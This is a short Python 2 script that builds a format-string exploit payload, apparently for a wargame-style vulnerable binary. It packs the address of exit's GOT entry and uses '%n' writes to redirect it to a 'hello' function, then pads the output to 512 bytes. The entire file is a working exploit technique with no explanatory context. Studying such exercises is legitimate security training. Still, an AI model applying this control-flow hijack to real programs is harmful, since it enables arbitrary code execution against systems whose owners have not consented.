#!/usr/bin/python
import struct

HELLO = 0x80484b4
EXIT_PLT = 0x8049724

BUF = 512

def pad(msg):
	return msg.ljust(BUF , 'X')

exploit = ""
exploit += struct.pack("I" , EXIT_PLT)
exploit += struct.pack("I" , EXIT_PLT + 2)
exploit += "%4$33964x"
exploit += "%4$n"
exploit += "%33616x"
exploit += "%5$n"


print pad(exploit)


